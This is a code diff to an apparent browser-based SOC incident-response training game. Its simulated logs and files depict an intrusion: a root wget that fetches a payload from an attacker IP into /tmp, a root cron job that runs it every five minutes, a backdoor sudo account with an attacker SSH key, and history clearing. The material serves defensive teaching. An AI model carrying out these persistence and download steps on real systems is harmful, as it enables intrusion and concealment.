+let termCwd = '/home';
 
 // Filesystem: each entry has visible files, hidden files, and parent path
 const termFS = {
   '/':                    { v:['etc','tmp','var','home','bin','usr'],          h:[],                                      p:'/' },
   '/etc':                 { v:['passwd','shadow','crontab','cron.d'],          h:[],                                      p:'/' },
-  '/etc/cron.d':          { v:['anacron','php','svc_backup_task'],             h:[],                                      p:'/etc' },
+  '/etc/cron.d':          { v:['anacron','php','service_backup_task'],             h:[],                                      p:'/etc' },
   '/tmp':                 { v:['tmpPzQ3x1'],                                   h:['.update_check'],                       p:'/' },
   '/var':                 { v:['log'],                                         h:[],                                      p:'/' },
   '/var/log':             { v:['auth.log','syslog','dpkg.log'],                h:[],                                      p:'/var' },
-  '/home':                { v:['analyst','jreyes','billing_svc','dev_marcus','svc_backup'], h:[],                         p:'/' },
+  '/home':                { v:['analyst','jreyes','billing_service','dev_marcus','service_backup','service_monitor','service_email'], h:[],  p:'/' },
   '/home/analyst':        { v:['logs','notes.txt','Desktop','Documents'],      h:['.bash_history','.bashrc','.bash_logout'], p:'/home' },
   '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
   '/home/jreyes':         { v:[],                                              h:['.bash_history','.bashrc'],             p:'/home' },
-  '/home/svc_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
-  '/home/svc_backup/.ssh': { v:['authorized_keys'],                           h:[],                                      p:'/home/svc_backup' },
-  '/home/billing_svc':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
+  '/home/service_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
+  '/home/service_backup/.ssh': { v:['authorized_keys'],                           h:[],                                      p:'/home/service_backup' },
+  '/home/billing_service':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
+  '/home/service_monitor':    { v:[],                                              h:[],                                      p:'/home' },
+  '/home/service_email':      { v:[],                                              h:[],                                      p:'/home' },
   '/home/dev_marcus':     { v:[],                                              h:['.bashrc','.bash_history'],             p:'/home' },
   '/bin':                 { v:['bash','sh','ls','cat','grep','ps'],            h:[],                                      p:'/' },
   '/usr':                 { v:['bin','sbin','local'],                          h:[],                                      p:'/' },
@@ -1939,12 +1982,17 @@ const termFiles = {
   '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# --- staff accounts (provisioned by IT, Mar 2020) ---
 jreyes:x:1000:1000:Jordan Reyes,,,:/home/jreyes:/bin/bash
-billing_svc:x:1001:1001:Billing Service Account,,,:/home/billing_svc:/bin/bash
-dev_marcus:x:1002:1002:Marcus (Dev),,,:/home/dev_marcus:/bin/bash
-analyst:x:1003:1003:SOC Analyst (you),,,:/home/analyst:/bin/bash
-svc_backup:x:1004:0:,,,:/home/svc_backup:/bin/bash
-contractor_q1:x:1005:1005:Q1 Contractor,,,:/home/contractor_q1:/bin/bash`,
+dev_marcus:x:1002:1002:Marcus Chen (Dev),,,:/home/dev_marcus:/bin/bash
+analyst:x:1003:1003:SOC Analyst,,,:/home/analyst:/bin/bash
+# --- service accounts (limited privileges, provisioned by IT) ---
+billing_service:x:1001:1001:Billing Service Account,,,:/home/billing_service:/bin/bash
+service_monitor:x:1006:1006:Monitoring Agent,,,:/home/service_monitor:/bin/bash
+service_email:x:1007:1007:Email Relay Service,,,:/home/service_email:/bin/bash
+# --- other ---
+service_backup:x:1004:0:,,,:/home/service_backup:/bin/bash
+contractor_q1:x:1005:1005:Q1 Contractor (expired),,,:/home/contractor_q1:/bin/bash`,
   '/etc/shadow': 'cat: /etc/shadow: Permission denied',
   '/etc/crontab': `# /etc/crontab
 SHELL=/bin/sh
@@ -1954,7 +2002,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 17 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6   * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6   * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )`,
-  '/etc/cron.d/svc_backup_task': `# Added by system
+  '/etc/cron.d/service_backup_task': `# Added by system
 */5 * * * * root /tmp/.update_check 2>/dev/null`,
   '/etc/cron.d/anacron': '# standard anacron job',
   '/etc/cron.d/php': '# php session cleanup',
@@ -1973,13 +2021,13 @@ May 18 01:54:01 clearpath-prod-01 sshd[3205]: Failed password for root from 185.
 ...
 May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2
 May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session opened for user root
-May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0, home=/home/svc_backup
-May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'svc_backup' to group 'sudo'
-May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`,
+May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=service_backup, UID=1004, GID=0, home=/home/service_backup
+May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'service_backup' to group 'sudo'
+May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2`,
   '/var/log/syslog': `May 18 02:14:11 clearpath-prod-01 dpkg: install netcat-openbsd:amd64 1.218-4ubuntu1
 May 18 02:14:14 clearpath-prod-01 dpkg: install wget:amd64 1.21.2-2ubuntu1
 May 18 02:14:38 clearpath-prod-01 kernel: [3249] root wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check
-May 18 02:14:50 clearpath-prod-01 kernel: [3253] root echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/svc_backup_task
+May 18 02:14:50 clearpath-prod-01 kernel: [3253] root echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task
 May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
 May 18 02:19:55 clearpath-prod-01 CRON[3301]: (root) CMD (/tmp/.update_check 2>/dev/null)
 May 18 02:22:01 clearpath-prod-01 kernel: [3295] root history -c
@@ -1988,12 +2036,25 @@ May 18 02:24:55 clearpath-prod-01 CRON[3341]: (root) CMD (/tmp/.update_check 2>/
 ls /tmp
 cat /etc/passwd
 history -c`,
+  '/home/billing_service/.bashrc': '# ~/.bashrc — billing_service\nexport PATH=/usr/local/bin:/usr/bin:/bin\nexport BILLING_ENV=production\nexport DB_HOST=127.0.0.1',
   '/home/analyst/.bashrc': '# ~/.bashrc: executed by bash(1) for non-login shells.',
   '/home/analyst/notes.txt': `SOC Investigation Notes — analyst
 Started: Mon May 18 08:31
-- Received alert about multiple failed SSH logins overnight
-- Need to check auth.log and cron jobs
-- Jordan says backups run at 2am — verify if legit`,
+
+ALERT: Overnight SSH anomaly flagged by SIEM. Investigating.
+
+KNOWN GOOD BASELINE (from IT onboarding docs):
+- Authorized human accounts: jreyes, dev_marcus, analyst
+- Authorized service accounts: billing_service, service_monitor, service_email
+- All accounts were provisioned by IT during business hours (2020-2022)
+- Service accounts run with LIMITED privileges — they do NOT have admin/sudo rights
+- Staff log in from internal IPs only (10.0.0.x range)
+- No external SSH access is authorized for service accounts
+
+TODO:
+- Check auth.log for the source IP triggering the alert
+- Verify no new accounts were created
+- jreyes flagged that the server felt slow around 2-3am — check if anything new was scheduled to run during that window`,
   '/home/analyst/logs/access.log': `10.0.0.5 - jreyes [18/May/2026:08:03:44 +0000] "GET /billing/dashboard HTTP/1.1" 200 4821
 10.0.0.5 - jreyes [18/May/2026:08:04:12 +0000] "GET /billing/reports HTTP/1.1" 200 9302
 185.220.101.42 - - [18/May/2026:02:15:01 +0000] "GET /admin HTTP/1.1" 403 512
@@ -2001,13 +2062,15 @@ Started: Mon May 18 08:31
 185.220.101.42 - - [18/May/2026:02:15:08 +0000] "POST /admin/login HTTP/1.1" 302 0`,
   '/home/analyst/logs/error.log': `[Mon May 18 02:15:08 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/admin
 [Mon May 18 02:15:09 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/phpmyadmin`,
-  '/home/svc_backup/.bash_history': `# .bash_history — svc_backup
+  '/home/service_backup/.bash_history': `# .bash_history — service_backup
 whoami
 id
+sudo -l
 cat /etc/passwd
-uname -a`,
-  '/home/svc_backup/.ssh': 'cat: /home/svc_backup/.ssh: Is a directory',
-  '/home/svc_backup/.ssh/authorized_keys': `# SSH authorized keys — svc_backup
+uname -a
+cat /etc/cron.d/service_backup_task`,
+  '/home/service_backup/.ssh': 'cat: /home/service_backup/.ssh: Is a directory',
+  '/home/service_backup/.ssh/authorized_keys': `# SSH authorized keys — service_backup
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vX2m...k9pQ attacker@anon`,
   '/home/dev_marcus/.bash_history': `# .bash_history — dev_marcus
 cd /opt/billing
@@ -2160,9 +2223,9 @@ function runTermCmd(raw) {
   if(verb === 'grep') {
     const gLower = lower;
     if(gLower.includes('failed') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\nMay 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2\nMay 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2\n[... 44 more failed attempts from 185.220.101.42 ...]\nMay 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2`;
-    if(gLower.includes('accept') && gLower.includes('auth.log')) return `May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2\nMay 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`;
-    if(gLower.includes('svc_backup') && gLower.includes('auth.log')) return `May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
-    if(gLower.includes('185.220') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\n[... 46 more lines from 185.220.101.42 ...]\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`;
+    if(gLower.includes('accept') && gLower.includes('auth.log')) return `May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2\nMay 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`;
+    if(gLower.includes('service_backup') && gLower.includes('auth.log')) return `May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=service_backup, UID=1004, GID=0\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2`;
+    if(gLower.includes('185.220') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\n[... 46 more lines from 185.220.101.42 ...]\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from 185.220.101.42 port 31338 ssh2`;
     return `grep: no matches found`;
   }
 
@@ -2196,8 +2259,8 @@ function runTermCmd(raw) {
     'id':           'uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)',
     'crontab -l':   '# Analyst crontab — nothing scheduled\nno crontab for analyst',
     'crontab -l -u root': 'crontab: must be privileged to use -u',
-    'last':         'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\n\nwtmp begins Tue Apr  1 09:00:00 2026',
-    'last -20':     'svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\nbilling_svc pts/0     10.0.0.8         Fri May 16 07:55 - 08:40  (00:45)\njreyes   pts/0        10.0.0.5         Thu May 15 09:11 - 17:02  (07:51)',
+    'last':         'service_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\n\nwtmp begins Tue Apr  1 09:00:00 2026',
+    'last -20':     'service_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in\nroot     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)\njreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in\ndev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)\nbilling_service pts/0     10.0.0.8         Fri May 16 07:55 - 08:40  (00:45)\njreyes   pts/0        10.0.0.5         Thu May 15 09:11 - 17:02  (07:51)',
     'ps aux':       'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1  22520  1024 ?        Ss   Apr01   0:04 /sbin/init\nroot       412  0.0  0.3  72184  3200 ?        Ss   Apr01   0:00 /usr/sbin/sshd -D\nroot      3847  0.0  0.1   4628  1024 ?        Ss   02:14   0:00 /tmp/.update_check\nroot      3849  0.0  0.0      0     0 ?        S    02:14   0:00 bash -i\nmysql     1203  0.0  2.1 558432 21448 ?        Ssl  Apr01   3:11 /usr/sbin/mysqld\nwww-data  1301  0.0  0.5 287612  5120 ?        Ss   Apr01   0:01 /usr/sbin/apache2\nanalyst   4201  0.0  0.1  21316  1024 pts/0    Ss   08:31   0:00 -bash\nanalyst   4298  0.0  0.0  37368   772 pts/0    R+   08:31   0:00 ps aux',
     'netstat -an':  'Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN\ntcp        0    128 10.0.0.4:22             185.220.101.42:31337    ESTABLISHED\ntcp        0      0 10.0.0.4:54321          185.220.101.42:4444     ESTABLISHED',
     'ss -tuln':     'Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port\ntcp    LISTEN  0       128          0.0.0.0:22        0.0.0.0:*\ntcp    LISTEN  0       80           0.0.0.0:80        0.0.0.0:*\ntcp    LISTEN  0       70         127.0.0.1:3306      0.0.0.0:*',
@@ -2229,13 +2292,13 @@ function downloadAuthLog() {
   }
   lines.push(`May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from ${ip} port 31337 ssh2`);
   lines.push(`May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session opened for user root by (uid=0)`);
-  lines.push(`May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0`);
+  lines.push(`May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=service_backup, UID=1004, GID=0`);
   // add some noise
   lines.push(`May 17 23:41:02 clearpath-prod-01 sshd[2901]: Failed password for admin from 45.33.32.156 port 22341 ssh2`);
   lines.push(`May 17 23:41:05 clearpath-prod-01 sshd[2901]: Failed password for admin from 45.33.32.156 port 22342 ssh2`);
   lines.push(`May 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`);
   lines.push(`May 18 08:03:11 clearpath-prod-01 sshd[4100]: pam_unix(sshd:session): session opened for user jreyes by (uid=0)`);
-  lines.push(`May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from ${ip} port 31338 ssh2`);
+  lines.push(`May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for service_backup from ${ip} port 31338 ssh2`);
   const blob = new Blob([lines.join('\n')], {type:'text/plain'});
   const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'auth.log'; a.click();
 }
@@ -2252,7 +2315,7 @@ async function saveMyWork() {
     'pb-recon','pb-recon-gaps','pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
     'pb-respond','pb-notify','pb-recover','pb-improve',
     'rpt-analyst','rpt-date','rpt-client','rpt-class',
-    'rpt-exec','rpt-timeline',
+    'rpt-exec','rpt-timeline','rpt-resume',
     'rpt-f1','rpt-f2','rpt-f3','rpt-f4','rpt-f5',
     'rpt-nist',
     'rpt-rec-imm','rpt-rec-short','rpt-rec-long',
@@ -2353,7 +2416,7 @@ function showHint(containerId, hints) {
 // ===================== AUTOSAVE =====================
 const SAVE_KEY = 'op_silent_pivot_save';
 const ALL_FIELD_IDS = [
-  'siem-notes','terminal-notes',
+  'siem-notes','terminal-notes','intel-what','intel-meaning','intel-why',
   'python-output','python-bugs','python-q1','python-q2','python-q3','python-q4',
   'pb-name','pb-datetime','pb-analyst','pb-class','pb-severity','pb-desc',
   'pb-recon','pb-recon-gaps','pb-identify','pb-phi','pb-protect','pb-detect-how','pb-detect-miss',
